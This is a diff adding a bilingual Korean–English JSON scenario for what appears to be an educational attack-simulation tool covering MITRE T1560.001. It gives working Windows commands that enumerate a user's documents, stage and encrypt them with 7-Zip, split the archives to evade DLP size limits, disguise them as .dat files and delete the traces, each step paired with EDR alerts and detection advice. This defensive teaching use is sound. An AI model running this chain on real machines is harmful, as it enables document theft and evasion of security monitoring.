@@ -1,0 +1,211 @@
+{
+  "id": "T1560.001",
+  "title": "유틸리티를 이용한 압축 수집 시뮬레이션",
+  "titleEn": "Archive Collected Data via Utility Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚡" },
+    { "label": "침투", "labelEn": "Breach", "icon": "🔓" },
+    { "label": "완료", "labelEn": "Complete", "icon": "✅" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 80, "y": 150, "type": "attacker" },
+    { "id": "target", "label": "Target PC", "x": 280, "y": 150, "type": "server" },
+    { "id": "staging", "label": "Staging Dir", "x": 280, "y": 50, "type": "server" },
+    { "id": "siem", "label": "EDR/DLP", "x": 480, "y": 150, "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "File Enum", "activeStep": 0 },
+    { "from": "target", "to": "staging", "label": "Copy Files", "activeStep": 1 },
+    { "from": "staging", "to": "target", "label": "7z Compress", "activeStep": 2 },
+    { "from": "target", "to": "siem", "label": "Alert", "activeStep": 2 }
+  ],
+  "desktopIcons": [
+    { "label": "Documents", "icon": "📁", "alertOnStep": 0 },
+    { "label": "7-Zip", "icon": "🗜️", "alertOnStep": 2 },
+    { "label": "Split Files", "icon": "📦", "alertOnStep": 4 }
+  ],
+  "steps": [
+    {
+      "cmd": "dir /s /b C:\\Users\\{userName}\\Documents\\*.docx C:\\Users\\{userName}\\Documents\\*.xlsx C:\\Users\\{userName}\\Documents\\*.pdf C:\\Users\\{userName}\\Documents\\*.pptx 2>nul | find /c /v \"\"",
+      "out": "156",
+      "def": "[EDR] Recursive file enumeration for sensitive document types",
+      "defAction": "Process: cmd.exe (PID: 4800)\nSearch Path: C:\\Users\\{userName}\\Documents\\\nPatterns: *.docx, *.xlsx, *.pdf, *.pptx\nResults: 156 files found\nRisk: MEDIUM",
+      "desc": "공격자가 사용자 문서 폴더에서 오피스 문서와 PDF 파일을 검색합니다. 156개의 잠재적 중요 파일을 식별합니다.",
+      "descEn": "The attacker searches the user's Documents folder for Office and PDF files, identifying 156 potentially important files.",
+      "stepTitle": "문서 파일 검색",
+      "stepTitleEn": "Document File Discovery",
+      "feynman": "도서관에서 값진 책만 골라내는 것과 같습니다. 공격자는 사용자의 문서 폴더에서 오피스 파일과 PDF를 찾아 156개의 잠재적 중요 파일을 식별합니다.",
+      "feynmanEn": "It is like selecting only valuable books from a library. The attacker searches the Documents folder for Office files and PDFs, identifying 156 potentially important files.",
+      "expert": "dir /s /b를 사용한 재귀 검색은 T1083(File and Directory Discovery)에 해당합니다. 공격자는 파일 확장자로 가치 있는 데이터를 필터링합니다. DLP에서 대량 파일 열거 패턴을 모니터링해야 합니다.",
+      "expertEn": "Recursive search using dir /s /b maps to T1083 (File and Directory Discovery). Attackers filter valuable data by file extension. DLP should monitor bulk file enumeration patterns.",
+      "defTooltip": "Sysmon Event ID 1에서 dir /s /b 명령과 함께 다수의 파일 확장자를 검색하는 패턴을 모니터링하세요.",
+      "defTooltipEn": "Monitor Sysmon Event ID 1 for dir /s /b commands searching multiple file extensions.",
+      "hackerLog": { "title": "file_search.log", "lines": [
+        { "log": "dir /s /b ...\\Documents\\*.docx ...\\*.xlsx ...\\*.pdf", "desc": "💡 오피스 문서와 PDF 파일을 재귀적으로 검색합니다" },
+        { "log": "156", "desc": "💡 156개의 잠재적 중요 파일이 발견되었습니다" }
+      ]},
+      "terms": [
+        { "term": "File Enumeration", "desc": "특정 조건에 맞는 파일을 체계적으로 검색하고 목록화하는 정찰 활동입니다" },
+        { "term": "dir /s /b", "desc": "Windows 명령으로 하위 폴더를 포함하여(/s) 파일 경로만(/b) 출력합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$staging = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\svc_cache';\nNew-Item -ItemType Directory -Path $staging -Force | Out-Null;\n$targets = Get-ChildItem 'C:\\Users\\{userName}\\Documents' -Recurse -Include '*.docx','*.xlsx','*.pdf','*.pptx' | Where-Object { $_.Length -gt 10KB };\n$targets | Copy-Item -Destination $staging -Force;\nWrite-Host \\\"Staged $($targets.Count) files ($([math]::Round(($targets | Measure-Object Length -Sum).Sum/1MB,2)) MB)\\\"\"",
+      "out": "Staged 142 files (287.45 MB)",
+      "def": "[EDR] Mass file copy to staging directory detected",
+      "defAction": "Process: powershell.exe (PID: 5100)\nSource: C:\\Users\\{userName}\\Documents\\\nDestination: %TEMP%\\svc_cache\\\nFiles Copied: 142\nTotal Size: 287.45 MB\nRisk: HIGH",
+      "desc": "10KB 이상인 문서 142개를 스테이징 디렉토리로 복사합니다. 디렉토리명을 서비스 캐시로 위장합니다.",
+      "descEn": "Copies 142 documents larger than 10KB to a staging directory. The directory name is disguised as a service cache.",
+      "stepTitle": "스테이징 디렉토리 복사",
+      "stepTitleEn": "Staging Directory Copy",
+      "feynman": "귀중품을 금고에 모아두는 것과 같습니다. 10KB 이상인 문서 142개를 임시 폴더에 복사하여 한곳에 모읍니다. 폴더 이름을 서비스 캐시로 위장합니다.",
+      "feynmanEn": "It is like gathering valuables into a safe. Copies 142 documents larger than 10KB to a temp folder. The folder name is disguised as a service cache.",
+      "expert": "T1074.001(Local Data Staging)에 해당하며, 디렉토리명을 svc_cache로 위장하여 정상 서비스 캐시처럼 보이게 합니다. 파일 크기 필터(10KB)는 빈 템플릿을 제외하기 위함입니다.",
+      "expertEn": "Maps to T1074.001 (Local Data Staging). Directory disguised as svc_cache to appear legitimate. File size filter (10KB) excludes empty templates.",
+      "defTooltip": "EDR에서 %TEMP% 하위에 대량의 파일이 짧은 시간 내 복사되는 패턴을 모니터링하세요.",
+      "defTooltipEn": "Monitor EDR for patterns of bulk file copying to %TEMP% subdirectories in short timeframes.",
+      "hackerLog": { "title": "staging.log", "lines": [
+        { "log": "Copy-Item -Destination $staging -Force", "desc": "💡 필터링된 문서 파일을 스테이징 디렉토리로 복사합니다" },
+        { "log": "Staged 142 files (287.45 MB)", "desc": "💡 287MB의 문서가 유출 준비를 위해 한곳에 모였습니다" }
+      ]},
+      "terms": [
+        { "term": "Data Staging (T1074)", "desc": "유출 전 수집한 데이터를 한 위치에 모아두는 준비 단계입니다" },
+        { "term": "Masquerading", "desc": "폴더나 파일 이름을 정상적인 것처럼 위장하는 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "\"C:\\Program Files\\7-Zip\\7z.exe\" a -tzip -p{companyName}2026! -mhe=on C:\\Users\\{userName}\\AppData\\Local\\Temp\\windows_diagnostics.zip C:\\Users\\{userName}\\AppData\\Local\\Temp\\svc_cache\\*",
+      "out": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov\n\nScanning the drive:\n142 files, 301326848 bytes (288 MiB)\n\nCreating archive: C:\\Users\\{userName}\\AppData\\Local\\Temp\\windows_diagnostics.zip\n\nAdd new data to archive: 142 files, 301326848 bytes (288 MiB)\n\n\nFiles read from disk: 142\nArchive size: 198234112 bytes (190 MiB)\nEverything is Ok",
+      "def": "[EDR] Password-protected archive creation with header encryption",
+      "defAction": "Process: 7z.exe (PID: 5300)\nArchive: windows_diagnostics.zip\nEncryption: AES-256 + Header Encryption\nInput: 142 files (288 MB)\nOutput: 190 MB compressed\nRisk: HIGH\nAction: Archive creation flagged",
+      "desc": "7-Zip으로 비밀번호 보호된 ZIP 아카이브를 생성합니다. 헤더 암호화(-mhe=on)로 파일 목록도 숨깁니다.",
+      "descEn": "Creates a password-protected ZIP archive with 7-Zip. Header encryption (-mhe=on) hides the file listing as well.",
+      "stepTitle": "ZIP 암호화 압축",
+      "stepTitleEn": "Encrypted ZIP Archive",
+      "feynman": "금고 안의 물건을 비밀번호가 걸린 여행 가방에 넣는 것과 같습니다. 7-Zip으로 비밀번호를 설정하고 헤더까지 암호화하면, 가방을 열어봐도 안에 뭐가 있는지 알 수 없습니다.",
+      "feynmanEn": "It is like putting items from a safe into a password-locked suitcase. Setting a password with 7-Zip and encrypting headers means even opening the bag reveals nothing.",
+      "expert": "-mhe=on 옵션은 AES-256으로 파일 목록(헤더)까지 암호화합니다. DLP가 ZIP 내부를 검사하려 해도 비밀번호 없이는 파일 이름조차 확인할 수 없습니다.",
+      "expertEn": "The -mhe=on option encrypts file listing (headers) with AES-256. DLP cannot see filenames without the password.",
+      "defTooltip": "Sysmon Event ID 1에서 7z.exe의 -p(비밀번호) 및 -mhe(헤더 암호화) 옵션 사용을 모니터링하세요.",
+      "defTooltipEn": "Monitor 7z.exe -p (password) and -mhe (header encryption) options in Sysmon Event ID 1.",
+      "hackerLog": { "title": "zip_encrypt.log", "lines": [
+        { "log": "7z.exe a -tzip -p{companyName}2026! -mhe=on", "desc": "💡 AES-256으로 비밀번호 보호 및 헤더 암호화된 ZIP을 생성합니다" },
+        { "log": "Archive size: 198234112 bytes (190 MiB)", "desc": "💡 288MB가 190MB로 압축되었습니다" }
+      ]},
+      "terms": [
+        { "term": "AES-256 Encryption", "desc": "256비트 키를 사용하는 대칭 암호화 알고리즘으로, 현재 가장 강력한 암호화 표준입니다" },
+        { "term": "Header Encryption (-mhe)", "desc": "아카이브 내부의 파일 목록까지 암호화하여 내용물 확인을 불가능하게 합니다" }
+      ]
+    },
+    {
+      "cmd": "\"C:\\Program Files\\7-Zip\\7z.exe\" a -t7z -mx=9 -p{companyName}2026! -mhe=on C:\\Users\\{userName}\\AppData\\Local\\Temp\\syshealth.7z C:\\Users\\{userName}\\AppData\\Local\\Temp\\svc_cache\\*",
+      "out": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov\n\nScanning the drive:\n142 files, 301326848 bytes (288 MiB)\n\nCreating archive: C:\\Users\\{userName}\\AppData\\Local\\Temp\\syshealth.7z\n\nCompressing  [=========================] 100%\n\nFiles read from disk: 142\nArchive size: 145678336 bytes (139 MiB)\nEverything is Ok",
+      "def": "[SIEM] High-compression archive with encryption - data staging pattern",
+      "defAction": "Process: 7z.exe (PID: 5320)\nArchive: syshealth.7z\nFormat: 7z (LZMA2)\nCompression: Ultra (-mx=9)\nEncryption: AES-256 + Header\nOutput: 139 MB\nRisk: HIGH",
+      "desc": "최대 압축률(-mx=9)로 7z 아카이브를 생성합니다. 288MB → 139MB로 유출 데이터 크기를 최소화합니다.",
+      "descEn": "Creates a 7z archive with maximum compression (-mx=9). Minimizes exfiltration data size from 288MB to 139MB.",
+      "stepTitle": "최대 압축 7z 생성",
+      "stepTitleEn": "Ultra Compression 7z",
+      "feynman": "여행 가방을 진공 압축기로 최대한 줄이는 것과 같습니다. LZMA2 알고리즘으로 최대 압축하면 288MB가 139MB로 줄어, 유출 시간이 크게 단축됩니다.",
+      "feynmanEn": "It is like using a vacuum compressor to minimize a suitcase. Maximum LZMA2 compression shrinks 288MB to 139MB, greatly reducing exfiltration time.",
+      "expert": "-mx=9는 LZMA2의 최대 압축 레벨로, 높은 CPU 사용률과 메모리를 요구하지만 최소 파일 크기를 달성합니다. 7z 형식은 ZIP보다 높은 압축률을 제공합니다.",
+      "expertEn": "-mx=9 is LZMA2 maximum compression, requiring high CPU and memory but achieving minimum file size. 7z format provides higher compression ratios than ZIP.",
+      "defTooltip": "Sysmon Event ID 1에서 7z.exe가 -mx=9(최대 압축) 옵션으로 실행되는 경우를 모니터링하세요.",
+      "defTooltipEn": "Monitor 7z.exe execution with -mx=9 (max compression) option in Sysmon Event ID 1.",
+      "hackerLog": { "title": "ultra_compress.log", "lines": [
+        { "log": "7z.exe a -t7z -mx=9 -mhe=on ...\\syshealth.7z", "desc": "💡 LZMA2 최대 압축으로 암호화된 7z 아카이브를 생성합니다" },
+        { "log": "Archive size: 145678336 bytes (139 MiB)", "desc": "💡 288MB → 139MB로 압축하여 유출 크기를 최소화했습니다" }
+      ]},
+      "terms": [
+        { "term": "LZMA2", "desc": "7-Zip에서 사용하는 고효율 압축 알고리즘으로, ZIP보다 높은 압축률을 제공합니다" },
+        { "term": "Ultra Compression (-mx=9)", "desc": "최대 압축률 설정으로, CPU/메모리를 많이 사용하지만 파일 크기를 최소화합니다" }
+      ]
+    },
+    {
+      "cmd": "\"C:\\Program Files\\7-Zip\\7z.exe\" a -v50m C:\\Users\\{userName}\\AppData\\Local\\Temp\\update_pkg C:\\Users\\{userName}\\AppData\\Local\\Temp\\syshealth.7z",
+      "out": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov\n\nScanning the drive:\n1 file, 145678336 bytes (139 MiB)\n\nCreating archive: C:\\Users\\{userName}\\AppData\\Local\\Temp\\update_pkg.7z.001\n\nCompressing  [=========================] 100%\n\nEverything is Ok\n\nVolumes: 3\n  update_pkg.7z.001 : 52428800 bytes\n  update_pkg.7z.002 : 52428800 bytes\n  update_pkg.7z.003 : 40820736 bytes",
+      "def": "[EDR] Archive split into volumes - evasion technique detected",
+      "defAction": "Process: 7z.exe (PID: 5340)\nAction: Volume split (50MB per volume)\nOutput: 3 volumes (update_pkg.7z.001~003)\nPurpose: Bypass file size monitoring\nRisk: HIGH\nAction: Alert escalated",
+      "desc": "대용량 아카이브를 50MB 볼륨으로 분할합니다. DLP(데이터 유출 방지) 시스템의 파일 크기 제한을 우회합니다.",
+      "descEn": "Splits the large archive into 50MB volumes to bypass DLP system file size thresholds.",
+      "stepTitle": "볼륨 분할",
+      "stepTitleEn": "Volume Split",
+      "feynman": "큰 가방을 여러 작은 가방으로 나누는 것과 같습니다. 139MB 파일을 50MB씩 3개로 나누면, DLP의 파일 크기 제한을 우회할 수 있습니다.",
+      "feynmanEn": "It is like splitting a large bag into several smaller ones. Splitting 139MB into three 50MB parts bypasses DLP file size limits.",
+      "expert": "7z의 -v 옵션으로 볼륨 분할하면 각 파트가 DLP의 파일 크기 임계값 아래로 내려갑니다. 분할된 파일은 개별적으로는 의미 없는 데이터처럼 보입니다.",
+      "expertEn": "Volume splitting with 7z -v brings each part below DLP thresholds. Split files appear as meaningless data individually.",
+      "defTooltip": "Sysmon Event ID 11에서 연속 번호(.001, .002, .003)가 붙은 파일 시리즈 생성을 모니터링하세요.",
+      "defTooltipEn": "Monitor Sysmon Event ID 11 for sequential numbered file series (.001, .002, .003).",
+      "hackerLog": { "title": "volume_split.log", "lines": [
+        { "log": "7z.exe a -v50m ...\\update_pkg ...\\syshealth.7z", "desc": "💡 139MB 아카이브를 50MB 단위로 분할합니다" },
+        { "log": "Volumes: 3", "desc": "💡 3개의 분할 파일로 나뉘어 DLP 파일 크기 제한을 우회합니다" }
+      ]},
+      "terms": [
+        { "term": "Volume Split (-v)", "desc": "대용량 파일을 지정된 크기의 여러 파트로 분할하는 7-Zip 옵션입니다" },
+        { "term": "DLP (Data Loss Prevention)", "desc": "민감한 데이터의 유출을 탐지하고 차단하는 보안 솔루션입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$files = @('update_pkg.7z.001','update_pkg.7z.002','update_pkg.7z.003');\nforeach($f in $files) {\n  $path = \\\"C:\\Users\\{userName}\\AppData\\Local\\Temp\\$f\\\";\n  $newName = $f -replace '\\.7z\\.','_part' -replace '$','.dat';\n  Rename-Item $path \\\"C:\\Users\\{userName}\\AppData\\Local\\Temp\\$newName\\\";\n  Write-Host \\\"Renamed: $f → $newName\\\";\n}\"",
+      "out": "Renamed: update_pkg.7z.001 → update_pkg_part001.dat\nRenamed: update_pkg.7z.002 → update_pkg_part002.dat\nRenamed: update_pkg.7z.003 → update_pkg_part003.dat",
+      "def": "[SIEM] File extension masquerading detected - archive disguised as data files",
+      "defAction": "Process: powershell.exe (PID: 5100)\nAction: Extension rename (.7z.00x → .dat)\nFiles: 3 archive volumes\nTechnique: File extension masquerading\nRisk: MEDIUM",
+      "desc": "분할된 아카이브 파일의 확장자를 .dat로 변경하여 일반 데이터 파일로 위장합니다.",
+      "descEn": "Renames split archive file extensions to .dat to masquerade as regular data files.",
+      "stepTitle": "확장자 위장",
+      "stepTitleEn": "Extension Masquerading",
+      "feynman": "택배 상자에 다른 물건 이름을 적어두는 것과 같습니다. .7z 확장자를 .dat로 변경하면, 보안 담당자가 봐도 일반 데이터 파일처럼 보입니다.",
+      "feynmanEn": "It is like labeling a delivery box with a different item name. Changing .7z to .dat makes files look like normal data files.",
+      "expert": "T1036.007(Double File Extension)의 변형으로, 확장자를 .dat로 변경하여 파일 유형 기반 DLP 규칙을 우회합니다. 방어를 위해 매직 바이트 기반 분석이 필요합니다.",
+      "expertEn": "A variant of T1036.007, changing extension to .dat to bypass file type-based DLP rules. Defense requires magic byte based analysis.",
+      "defTooltip": "DLP에서 파일 확장자와 매직 바이트가 불일치하는 파일을 탐지하세요.",
+      "defTooltipEn": "Detect files with mismatched extensions and magic bytes in DLP.",
+      "hackerLog": { "title": "rename.log", "lines": [
+        { "log": "Rename-Item ... .7z.001 → _part001.dat", "desc": "💡 아카이브 확장자를 .dat로 변경하여 일반 파일로 위장합니다" },
+        { "log": "Renamed: update_pkg.7z.001 → update_pkg_part001.dat", "desc": "💡 3개의 분할 아카이브가 모두 .dat 파일로 위장되었습니다" }
+      ]},
+      "terms": [
+        { "term": "Extension Masquerading (T1036)", "desc": "파일 확장자를 변경하여 파일 유형을 위장하는 DLP 회피 기법입니다" },
+        { "term": "Magic Bytes", "desc": "파일의 첫 몇 바이트로, 실제 파일 유형을 식별하는 데 사용됩니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"Remove-Item 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\svc_cache' -Recurse -Force; Remove-Item 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\syshealth.7z' -Force; Remove-Item 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\windows_diagnostics.zip' -Force; Write-Host 'Staging artifacts cleaned'; Get-ChildItem 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\update_pkg*' | Select-Object Name, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}\"",
+      "out": "Staging artifacts cleaned\n\nName                       SizeMB\n----                       ------\nupdate_pkg_part001.dat      50.00\nupdate_pkg_part002.dat      50.00\nupdate_pkg_part003.dat      38.93",
+      "def": "[EDR] Evidence cleanup detected - intermediate staging files deleted",
+      "defAction": "Process: powershell.exe (PID: 5100)\nDeleted: svc_cache\\ (142 files), syshealth.7z, windows_diagnostics.zip\nRemaining: 3 disguised archive volumes (138.93 MB)\nRisk: HIGH\nAction: Deleted file recovery initiated",
+      "desc": "중간 스테이징 파일을 삭제하여 흔적을 제거합니다. 최종 유출용 위장 파일만 남깁니다.",
+      "descEn": "Deletes intermediate staging files to remove traces. Only the final disguised exfiltration files remain.",
+      "stepTitle": "흔적 제거",
+      "stepTitleEn": "Evidence Cleanup",
+      "feynman": "범행 현장을 청소하는 것과 같습니다. 중간 단계에서 사용한 임시 파일들을 삭제하여 흔적을 최소화합니다. 최종 유출용 위장 파일만 남깁니다.",
+      "feynmanEn": "It is like cleaning up a crime scene. Deleting temp files from intermediate steps minimizes traces. Only final disguised files remain.",
+      "expert": "T1070.004(File Deletion)에 해당하며, 중간 스테이징 파일을 삭제하여 포렌식 추적을 어렵게 합니다. NTFS의 $MFT와 $UsnJrnl에 삭제 흔적이 남아 복구 가능할 수 있습니다.",
+      "expertEn": "Maps to T1070.004 (File Deletion). Deleting staging files hinders forensic tracking. Deletion traces in NTFS $MFT and $UsnJrnl may enable recovery.",
+      "defTooltip": "Sysmon Event ID 23(파일 삭제)에서 대량의 파일이 짧은 시간 내 삭제되는 패턴을 모니터링하세요.",
+      "defTooltipEn": "Monitor Sysmon Event ID 23 (File Deletion) for bulk file deletion in short timeframes.",
+      "hackerLog": { "title": "cleanup.log", "lines": [
+        { "log": "Remove-Item ... -Recurse -Force", "desc": "💡 중간 스테이징 파일(142개 문서, 원본 아카이브)을 삭제합니다" },
+        { "log": "Staging artifacts cleaned", "desc": "💡 최종 유출용 위장 파일 3개만 남고 모든 흔적이 제거되었습니다" }
+      ]},
+      "terms": [
+        { "term": "Anti-Forensics (T1070)", "desc": "포렌식 조사를 방해하기 위해 증거를 삭제하거나 변조하는 행위입니다" },
+        { "term": "$MFT (Master File Table)", "desc": "NTFS 파일 시스템의 메타데이터로, 삭제된 파일의 흔적이 남아 복구에 사용됩니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "cmd.exe (PID: 4800)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "dir.exe (document search)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 5100)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "Copy-Item → svc_cache\\ (142 files)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "7z.exe (PID: 5300) [ZIP+AES]", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "7z.exe (PID: 5320) [7z+LZMA2]", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "7z.exe (PID: 5340) [Volume Split]", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "Rename-Item (.7z → .dat)", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "Remove-Item (cleanup)", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
